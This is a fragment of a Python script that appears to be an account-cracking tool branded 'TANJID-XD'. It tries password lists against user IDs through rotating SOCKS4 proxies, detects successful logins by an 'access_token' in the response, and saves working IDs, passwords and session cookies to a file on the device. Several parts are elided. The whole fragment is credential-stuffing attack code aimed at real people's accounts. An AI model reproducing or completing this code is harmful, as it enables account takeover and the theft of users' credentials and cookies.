    ...
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                ...
                if res == 'LIVE':
                	print(f'\r\r{A}[{G1}JAVA-OK{A}]{G1} {uid} {A}|{G1} {pas}');open('/sdcard/JAVA-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                if res == 'LOCK':
                	print(f'\r\r{A}[{S} TANJID-XD{A}]{S} {uid} {A}|{S} {pas}');break
            else:continue
        loop+=1
    except Exception as e:
        pass
...
def M1(ids,names,psd):
    ...
    nip=random.choice(prox)
    proxs= {'http': 'socks4://'+nip}
    sys.stdout.write(f'\r\r{A}[{G1}TANJID-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        ...
        for pw in psd:
            ...
            if 'access_token' in po:
                print(f'\r\r{A}[{G1}JAVA-OK{A}]{G1} {ids} {A}|{G1} {pas}')
